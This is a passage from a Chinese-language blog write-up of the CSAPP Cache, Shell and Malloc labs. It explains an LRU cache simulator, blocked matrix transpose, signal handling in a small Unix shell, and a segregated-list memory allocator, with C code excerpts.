<p>在Part A中，我们需要仿造<code>csim-ref</code>，编写一个cache模拟器，该模拟器可以模拟在一系列的数据访问中cache的命中、不命中与牺牲行的情况，其中，需要牺牲行时，用LRU替换策略进行替换。</p>
</li>
<li>
<p>偷了个小懒，直接把csim-ref逆向出了源代码 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/5.%20Cache%20Lab/csim.c" target="_blank" rel="noopener">github</a></p>
</li>
<li>
<p>Cache主体的数据结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">mem_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cache_line_t</span>&#123;</span></span><br><span class="line">    <span class="keyword">mem_addr_t</span> tag;</span><br><span class="line">    <span class="keyword">int</span> valid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> lru; </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache_line_t</span>* <span class="title">cache_set_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">cache_set_t</span>* <span class="keyword">cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">cache_t</span> cache;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>每次获取数据时，都需要修改该数据中的LRU。同时，如果该数据并没有存放于Cache中，则需要根据LRU来驱逐某条Cache_line。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">accessData</span><span class="params">(<span class="keyword">mem_addr_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> eviction_line;</span><br><span class="line">  <span class="comment">// 注意是无符号整数</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> eviction_lru = <span class="number">-1</span>;</span><br><span class="line">  eviction_line = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">mem_addr_t</span> tag = addr &gt;&gt; (s + b);</span><br><span class="line">  <span class="keyword">cache_set_t</span> cache_set = cache[(addr &gt;&gt; b) &amp; set_index_mask];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 所需数据的cache_line编号</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果把所有的cache_line全遍历完了还找不到所需的数据</span></span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= E )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 数据未命中</span></span><br><span class="line">      ++miss_count;</span><br><span class="line">      <span class="keyword">if</span> ( verbosity )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"miss "</span>);</span><br><span class="line">      <span class="comment">// 在一组cache_line中查找将被删除的cache_line</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> ia = <span class="number">0</span>; ia &lt; E; ++ia )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( cache_set[ia].lru &lt; eviction_lru )</span><br><span class="line">        &#123;</span><br><span class="line">          eviction_line = ia;</span><br><span class="line">          eviction_lru = cache_set[ia].lru;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 如果当前这个要被删除的cache_line是valid</span></span><br><span class="line">      <span class="comment">// 即，这个要被替换数据的cache_line是一条之前读入的数据而不是空行</span></span><br><span class="line">      <span class="keyword">if</span> ( cache_set[eviction_line].valid )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 删除数+1</span></span><br><span class="line">        ++eviction_count;</span><br><span class="line">        <span class="keyword">if</span> ( verbosity )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"eviction "</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 模拟读入并覆盖数据到这个刚刚被删除（或本来是空行）的cache_line里</span></span><br><span class="line">      cache_set[eviction_line].valid = <span class="number">1</span>;</span><br><span class="line">      cache_set[eviction_line].tag = tag;</span><br><span class="line">      cache_set[eviction_line].lru = lru_counter++;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找cache中的数据</span></span><br><span class="line">    <span class="keyword">if</span> ( cache_set[i].tag == tag &amp;&amp; cache_set[i].valid )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果找到数据了，自然就hit_count++</span></span><br><span class="line">  ++hit_count;</span><br><span class="line">  <span class="keyword">if</span> ( verbosity )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hit "</span>);</span><br><span class="line">  cache_set[i].lru = lru_counter++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-Part-B-2">2) Part B</h3>
<ul>
<li>在Part B中，我们需要编写一个实现矩阵转置的函数，并且使函数调用过程中对cache的不命中数miss尽可能少</li>
<li>测试程序所使用的cache模拟器的参数为<code>-S 5 -E 1 -B 5</code>。即该cache为内含32个缓存行的<em>直接映射高速缓存</em>，其中每个缓存行可以存放32位数据，即8个int型数据。</li>
<li>由刚刚计算出的cache规模可知，该cache最多可读入32x32矩阵中的8行数据。故我们可将32x32矩阵以每块8x8的大小分割并转置存放到另一个矩阵中，这样便可以减小cache的miss数，拿到满分。</li>
<li>同理，该cache最多可读入64x64矩阵的4行数据。故分割64x64矩阵为数个4x4大小的矩阵并转置处理，会较大的降低miss数量。
<blockquote>
<p>原先的8x8分割无法使用，原因是这样会产生内部的访问冲突，加大miss数量。<br>
请注意，倘若按照4x4的大小来分割，则会浪费一半的cache空间，所以这并非64x64矩阵的最优解法，但这是笔者能想到的最优解法。</p>
</blockquote>
</li>
<li>至于61x67矩阵，由于测试程序放宽了miss数量的限制，故将大型矩阵切割为16x16即可满分。</li>
<li>Part B中限制了临时变量的个数，最多使用12个临时变量。要想进一步降低miss数量，最好单次将一整个缓存行里的数据全部读出到临时变量中，这样该缓存行内的数据一旦被驱逐，下次需要读取数据时就不必再次读入cache，减小miss数。</li>
<li>笔者最终的代码实现 - <a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/5.%20Cache%20Lab/trans.c" target="_blank" rel="noopener">github</a></li>
</ul>
<h3 id="3-测试">3) 测试</h3>
<ul>
<li>使用<code>make &amp;&amp; ./driver.py</code>命令进行测试。以下是笔者的测试结果。<br>
<img src="/2020/07/csapp-lab-writeup/cache_lab_partB.png" alt="img"></li>
</ul>
<h2 id="6-Shell-Lab">6. Shell Lab</h2>
<ul>
<li>
<p>在这个Lab中，我们需要完善<code>tsh.c</code>代码，做出一个简单的shell程序。注意，在完成这个Lab前，最好把第八章异常程序控制流的相关内容理解透彻。</p>
</li>
<li>
<p>编写时，有几个点需要注意一下</p>
<ul>
<li>
<p>避免条件竞争。</p>
<ul>
<li>
<p>如果子进程在tsh<code>fork</code>之后、<code>addjob</code>前结束进程，则此时会因为<code>SIGCHLD</code>信号，转去信号处理程序里执行<code>deletejob</code>。</p>
</li>
<li>
<p>此时的执行顺序就变成了<code>deletejob</code>-&gt;<code>addjob</code>，这将会产生一个永远存在的job，即便该job所指定的进程已经终止了。</p>
</li>
<li>
<p>所以我们在执行<code>fork</code>函数前，将一些可能会导致条件竞争的信号阻塞，待<code>addjob</code>执行完成后再来处理信号。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(sigemptyset(&amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigemptyset error"</span>);</span><br><span class="line"><span class="keyword">if</span>(sigaddset(&amp;<span class="built_in">set</span>, SIGINT) &lt; <span class="number">0</span> || sigaddset(&amp;<span class="built_in">set</span>, SIGTSTP) &lt; <span class="number">0</span> || sigaddset(&amp;<span class="built_in">set</span>, SIGCHLD) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigaddset error"</span>);</span><br><span class="line"><span class="comment">// 在fork前，将SIGCHLD信号阻塞，防止并发错误——_竞争_ 的发生</span></span><br><span class="line"><span class="keyword">if</span>(sigprocmask(SIG_BLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigprocmask error"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>与当前进程一样，<code>fork</code>出的子进程，其被阻塞的信号是相同的，故子进程必须恢复回被阻塞的信号。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 子进程的控制流开始</span></span><br><span class="line">  <span class="keyword">if</span>(sigprocmask(SIG_UNBLOCK, &amp;<span class="built_in">set</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      unix_error(<span class="string">"sigprocmask error"</span>);</span><br><span class="line">  <span class="keyword">if</span>(setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      unix_error(<span class="string">"setpgid error"</span>);</span><br><span class="line">  <span class="keyword">if</span>(execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s: command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>信号不排队</p>
<ul>
<li>
<p>如果有多个子进程同时终止并发出<code>SIGCHLD</code>信号，则tsh主进程只会收到一个信号，而不是多个。</p>
</li>
<li>
<p>原因是当某个类型的信号被阻塞后，新来的相同类型信号会被简单的丢弃。</p>
</li>
<li>
<p>所以在回收子进程时，应使用循环形式尽可能多的回收进程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sigchld_handler函数中</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以非阻塞方式等待所有子进程</span></span><br><span class="line"><span class="comment">waitpid 参数3：</span></span><br><span class="line"><span class="comment">    1.     0     ： 执行waitpid时， 只有在子进程 **终止** 时才会返回。</span></span><br><span class="line"><span class="comment">    2. WNOHANG   : 若子进程仍然在运行，则返回0 。</span></span><br><span class="line"><span class="comment">            注意只有设置了这个标志，waitpid才有可能返回0</span></span><br><span class="line"><span class="comment">    3. WUNTRACED : 如果子进程由于传递信号而停止，则马上返回。</span></span><br><span class="line"><span class="comment">            只有设置了这个标志，waitpid返回时，其WIFSTOPPED(status)才有可能返回true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>只应使<code>SIGCHLD</code>信号处理程序执行<code>waitpid</code>。</p>
<ul>
<li>
<p>该信号处理程序会处理所有子进程的暂停/终止状态，而tsh进程在等待前台进程结束时，只需简单的挂起即可，无需再次执行<code>waitpid</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 如果当前子进程的状态没有发生改变，则tsh继续休眠</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        <span class="comment">// 使用sleep的这段代码会比较慢，最好使用sigsuspend</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"waitfg: Process (%d) no longer the fg process\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>否则<code>waitfg</code>、<code>sigchld_handler</code>两边都执行<code>waitpid</code>函数，这可能会造成一些无法预料到的、令人感到迷惑的错误。</p>
</li>
</ul>
</li>
<li>
<p>fork出的新子进程需要重新设置进程组号</p>
<ul>
<li>原因是当从bash运行tsh时，tsh在bash前台进程组中运行。</li>
<li>如果tsh随后创建了一个子进程，默认情况下，该子进程也将是bash前台进程组的成员。</li>
<li>由于输入ctrl-c将向bash前台组中的每个进程发送一个SIGINT，因此该信号会被tsh以及tsh创建的每个进程所接收，这显然是不正确的。</li>
<li>所以子进程应该调用<code>setpgid(0,0)</code>，这将使子进程放入一个新的进程组中，其中该进程组的ID与子进程的PID相同。这确保bash前台进程组中只有一个进程，即tsh进程。</li>
<li>当键入ctrl-c时，tsh应该捕获结果SIGINT，然后将其转发到适当的前台进程。</li>
</ul>
</li>
<li>
<p>当主进程需要暂时挂起时，最好使用<code>sigsuspend</code>挂起，而不是简单的使用<code>sleep</code>，因为<code>sleep</code>的速度过于低下。</p>
</li>
<li>
<p>在信号处理程序中，最好使用<em>原子</em>函数，因为这类函数在执行时不会因为其他信号的触发而被打断。<br>
以<code>printf</code>函数为例，该函数不推荐在信号处理程序中使用，因为它不是原子类型的函数。<br>
当执行<code>printf</code>函数时，倘若被另一个信号中断，待从信号中断程序返回并继续执行<code>printf</code>时，<code>printf</code>很有可能会执行失败。</p>
</li>
<li>
<p>发送信号给子进程时，最好发送给子进程所在的进程组。例如发送<code>SIGTSTP</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">  unix_error(<span class="string">"kill (tstp) error"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>sigchld_handler</code>处理<code>SIGCHLD</code>信号时，需要对三类情况分开处理，分别是</p>
<ul>
<li>子进程收到暂停信号，还没终止(<code>WIFSTOPPED(status)</code>)</li>
<li>子进程正常退出/终止(<code>WIFEXITED(status)</code>)</li>
<li>子进程因为其他信号而异常退出，例如<code>SIGKILL</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>笔者将<code>tshref</code>的源代码（相似度高达98%)存于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/6.%20Shell%20Lab/tsh.c" target="_blank" rel="noopener">github</a>。</p>
<blockquote>
<p>由于tsh只是一个较为简单的程序，故编写时仍然使用了一些不被推荐的函数(例如<code>sleep</code>、<code>printf</code>)以降低编写难度。</p>
</blockquote>
</li>
</ul>
<h2 id="7-Malloc-Lab">7. Malloc Lab</h2>
<ul>
<li>在做本实验前，需要先理解<em>虚拟内存</em>那一章中动态内存分配的相关内容</li>
</ul>
<h3 id="1-注意点">1) 注意点</h3>
<blockquote>
<p>在做malloc lab时，有几个点需要注意一下</p>
</blockquote>
<ul>
<li>
<p>使用大量宏定义</p>
<ul>
<li>指针操作是复杂且容易出错的，可以将指针操作设置为一个宏定义来使用，方便统一管理与修改。</li>
<li>如果程序需要设置一些输出以方便调试，使用宏定义可以非常方便的打开/关闭这些输出，不必一个个注释。</li>
<li>使用宏定义<code>assert</code>可以限制程序运行时的一些条件，方便查找错误。</li>
<li>如果代码编写到一半想更改chunk的结构，最好使用<code>#ifdef、#else、#endif</code>宏定义，这样不仅可以<strong>保留旧的chunk结构</strong>，而且还可以快速从新旧结构中切换，非常方便。
<blockquote>
<p>最好将旧的chunk结构保留。<br>
因为很有可能在编写新结构时发现一个致命错误，从而不得不重新使用旧的结构。</p>
</blockquote>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC_MASK      1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_FREE_MASK  2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)              (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_RAW_SIZE(p)         (GET(p))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)             (GET_RAW_SIZE(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_PREV_SIZE(p)        (GET_SIZE((p) - WSIZE))</span></span><br><span class="line"><span class="comment">// 这里的SET_SIZE将会保留最后2位</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_SIZE(p, val)        (GET_RAW_SIZE(p) = (val | (GET_RAW_SIZE(p) &amp; (ALLOC_MASK | PREV_FREE_MASK))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p)                (GET_RAW_SIZE(p) &amp; ALLOC_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_ALLOC(p)                (GET_RAW_SIZE(p) |= ALLOC_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_FREE(p)              (GET_RAW_SIZE(p) &amp;= ~ALLOC_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_PREV_FREE(p)     (GET_RAW_SIZE(p) &amp; PREV_FREE_MASK )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PREV_FREE(p)            (GET_RAW_SIZE(p) |= PREV_FREE_MASK )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SET_PREV_ALLOC(p)          (GET_RAW_SIZE(p) &amp;= ~PREV_FREE_MASK )</span></span><br><span class="line"><span class="comment">// footer可以空间复用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2chunksize(size) \</span></span><br><span class="line">    ((size) &gt; (MIN_CHUNKSIZE - WSIZE) ? ALIGN(size+WSIZE) : MIN_CHUNKSIZE)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FD(p)           (*(void**)((void*)(p) + WSIZE))</span></span><br><span class="line"><span class="comment">// 传入指向fd的指针，传出指向该chunk的header的指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FD2HD(p)        ((void*)((void*)(p) - WSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BK(p)           (*(void**)((void*)(p) + DSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_CHUNK(p)   ((void*)((void*)(p) + GET_SIZE(p)))</span></span><br><span class="line"><span class="comment">// PREV_CHUNK当且仅当上一个chunk是free chunk才能使用</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_CHUNK(p)   (((void*)(p) - GET_PREV_SIZE(p)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FOOTER(p)       (NEXT_CHUNK(p) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HD2MEM(p)       ((void*)((void*)(p) + WSIZE))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEM2HD(p)       (FD2HD(p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// debug专用宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBG(s) assert(s)</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>指针运算</p>
<ul>
<li>
<p>需要注意的是，不同的指针类型与数字运算，可能会偏移不同的字节数。最好将所有指针强制转换为<code>char*</code>或<code>void*</code>类型再操作。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* ip = <span class="number">0x1100</span>;</span><br><span class="line">ip += <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 此时ip == 0x1104，指针偏移了4个字节（32位环境）</span></span><br><span class="line"><span class="comment">/*******************************/</span></span><br><span class="line"><span class="keyword">void</span>* vp = <span class="number">0x1100</span>;</span><br><span class="line">vp += <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 此时vp == 0x1101，指针偏移了1个字节</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>考虑边界情况</p>
<ul>
<li>向前合并时，需要手动对内存布局中第一个chunk进行特殊处理，原因是第一个chunk前<strong>不存在任何chunk</strong>。</li>
<li>同时，我们还必须针对最后一个chunk做一些特殊处理。因为当某个chunk被释放后，我们需要对该chunk的下一个chunk的<code>PREV_INUSE</code>位进行设置。但如果这个被释放的chunk是最后一个chunk，此时设置<em>下一个chunk</em>的相关位就会产生<code>off by one</code>漏洞，所以需要对最后一个chunk进行特殊处理。</li>
</ul>
</li>
<li>
<p>内存对齐</p>
<ul>
<li><code>mdriver</code>程序会验证<strong>用户空间地址</strong>(不是chunk首地址)是否对齐，因此需要手动在初始化时抬高<code>brk</code>4个字节的空间。</li>
</ul>
</li>
</ul>
<h3 id="2-思路">2) 思路</h3>
<blockquote>
<p>笔者使用了分离适配原则，最终代码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/7.%20Malloc%20Lab/mm.c" target="_blank" rel="noopener">github</a>，下面来简单讲讲思路</p>
</blockquote>
<ul>
<li>
<p>首先，chunk的结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free chunk的结构</span><br><span class="line">+-------------+</span><br><span class="line">| chunksize|00|   &lt;- chunk size 包含两个标志位，表示当前chunk以及上一个chunk是否使用</span><br><span class="line">+-------------+</span><br><span class="line">|       fd    |   &lt;- 用户所使用的空间，包括对齐的空间。该空间地址以8字节为对齐标准</span><br><span class="line">|       bk    |</span><br><span class="line">|   (padding) |</span><br><span class="line">+-------------+</span><br><span class="line">|  chunksize  |   &lt;- chunk size，无标志位，可空间复用</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>当该chunk被释放，即<code>free chunk</code>，则该chunk的最后4个字节会用于设置当前free chunk的大小，同时设置下一个内存相邻chunk的chunksize部分的<code>PREV_INUSE</code>位。</p>
</li>
<li>
<p>但由于每个free chunk都会设置下一个chunk的相关位，如果内存中最靠后的一个chunk被释放，则会修改尚未分配的内存，这可能会导致<code>off by one</code>漏洞。所以又额外设置了一个<code>top chunk</code>指针，该指针指向内存中最靠后的chunk，该chunk独立管理，不添加进链表中。</p>
</li>
<li>
<p>由于一个chunk中的<code>PREV_INUSE</code>位表明上一个内存相邻chunk的分配情况，故内存中最靠前的chunk的<code>PREV_INUSE</code>位需要额外处理，因为该chunk之前不存在chunk。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 将brk抬高4字节，这样每个chunk的用户空间就满足八字节对齐标准</span></span><br><span class="line">    <span class="comment">// 同时，设置top chunk</span></span><br><span class="line">    <span class="keyword">int</span> topSize = (CHUNKSIZE &gt; MIN_CHUNKSIZE ? CHUNKSIZE : MIN_CHUNKSIZE);</span><br><span class="line">    top_chunk = mem_sbrk(<span class="number">4</span> + topSize) + <span class="number">4</span>;</span><br><span class="line">    SET_SIZE(top_chunk, topSize);</span><br><span class="line">    SET_FREE(top_chunk);</span><br><span class="line">    <span class="comment">// 第一个chunk，设置前面的空间为不可合并</span></span><br><span class="line">    SET_PREV_ALLOC(top_chunk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>该程序使用分离的链表来管理各个chunk，每个数组中存放两个指针——<code>FD</code>、<code>BK</code>，分别指向链首的chunk和链尾的chunk。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> getListIndx(chunkSize)      \</span></span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">12</span>) ? <span class="number">8</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">11</span>) ? <span class="number">7</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">10</span>) ? <span class="number">6</span> :  \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">9</span>) ? <span class="number">5</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) ? <span class="number">4</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) ? <span class="number">3</span> :   \</span><br><span class="line">  ((chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">6</span>) ? <span class="number">2</span> :   \</span><br><span class="line">  (chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">5</span>) ? <span class="number">1</span> :    \</span><br><span class="line">  (chunkSize) &gt;= (<span class="number">1</span> &lt;&lt; <span class="number">4</span>) ? <span class="number">0</span> : <span class="number">-1</span> \</span><br><span class="line">  )))))))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ChunkSize:</span></span><br><span class="line"><span class="comment">0x10-0x20       2^4</span></span><br><span class="line"><span class="comment">0x20-0x40       2^5</span></span><br><span class="line"><span class="comment">0x40-0x80       2^6</span></span><br><span class="line"><span class="comment">0x80-0x100      2^7</span></span><br><span class="line"><span class="comment">0x100-0x200     2^8</span></span><br><span class="line"><span class="comment">0x200-0x400     2^9</span></span><br><span class="line"><span class="comment">0x400-0x800     2^106</span></span><br><span class="line"><span class="comment">0x800-0x1000    2^11</span></span><br><span class="line"><span class="comment">0x1000-~        2^12</span></span><br><span class="line"><span class="comment">9 bins(void*)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAP_LIST_NUM 9</span></span><br><span class="line"><span class="keyword">void</span>* heap_listp[HEAP_LIST_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="comment">// top_chunk指向的chunk不存在heap_listp中，同时其指向的chunk一定在堆的最高</span></span><br><span class="line"><span class="keyword">void</span>* top_chunk = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>相关函数的实现</p>
<ul>
<li><code>mm_init</code>: 初始化链表、抬高4字节使chunk的用户空间通过8字节对齐标准、手动分配并设置第一块chunk的<code>PREV_INUSE</code>位为0、分配一块超大内存给<code>top_chunk</code>。</li>
<li><code>mm_malloc</code>: 首先查找各个链表中是否存在所需要的chunk。
<ul>
<li>如果有，则断开链表、切割chunk、设置chunk的头部与尾部（只有切割下的chunk会设置尾部）、将剩余chunk放回链表、返回用户地址一条龙。</li>
<li>如果没有，则判断<code>top chunk</code>的空间是否足够分配
<ul>
<li>如果足够，切割top chunk、设置chunk的首尾、重新设置top_chunk、将目标chunk的用户地址返回。</li>
<li>如果不够，将当前top chunk插入链表中，重新分配一块超大内存给<code>top_chunk</code>指针，之后重新递归执行<code>mm_malloc</code>，返回该递归执行的返回值。</li>
</ul>
</li>
</ul>
</li>
<li><code>mm_free</code>: chunk的释放策略非常简单，直接将传入的chunk插入特定索引的链表中即可。插入时自动合并相邻的chunk。</li>
<li><code>mm_realloc</code>: 该函数先将传入指针的上下两块可能空闲的chunk合并，然后判断当前chunk的大小是否符合需求。
<ul>
<li>如果不符合要求，则分配一块新的内存，复制数据，并最后释放旧的chunk</li>
<li>如果合并后的chunk大小满足需求，则复制数据并切割多余的空间（如果有多余空间的话）。
<blockquote>
<p>这里的复制数据最好使用<code>memmove</code>，因为合并后的chunk与原先传入的chunk，其首部可能存在重叠，<code>memmove</code>可以避免这种因为chunk重叠而数据被破坏的错误。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-评分">3) 评分</h3>
<ul>
<li>代码编了差不多有两天，但分数一般般，<code>86/100</code>
<blockquote>
<p>评分程序中的<code>valid</code>表示是否通过当前测试用例，<br>
<code>util</code>表示空间利用率，<br>
<code>ops</code>表示当前测试用例内的所有操作总数，<br>
<code>secs</code>表示执行当前用例所耗的总时间，<br>
<code>Kops</code>即<code>Kop/s</code>，表示执行操作的速度，可以间接理解为吞吐量。<br>
<img src="/2020/07/csapp-lab-writeup/malloc_lab_score.png" alt="img"></p>
</blockquote>
<ul>
